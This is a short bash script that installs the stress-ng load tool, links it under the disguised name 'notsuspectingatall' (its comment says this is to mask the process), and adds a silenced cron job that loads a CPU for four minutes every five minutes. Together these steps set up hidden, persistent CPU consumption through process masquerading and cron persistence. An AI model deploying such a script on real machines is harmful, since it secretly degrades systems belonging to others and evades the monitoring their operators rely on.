#!/bin/bash

#install stress-ng
apt-get update && apt-get install -y stress-ng atop sysstat

sleep 20

#check if installed stress-ng
dpkg -s stress-ng &> /dev/null  

    if [ $? -ne 0 ]

        then
            echo "not installed"  
            sudo apt-get update
            sudo apt-get install stress-ng atop sysstat

        else
            echo    "installed"
    fi

#create symlink to mask fio process
ln -s /usr/bin/stress-ng /usr/bin/notsuspectingatall

#write out current crontab
crontab -l > mycron

#echo new cron into cron file
echo "*/5 * * * * notsuspectingatall --cpu 1 -t 4m >/dev/null 2>&1" >> mycron

#install new cron file
crontab mycron
rm mycron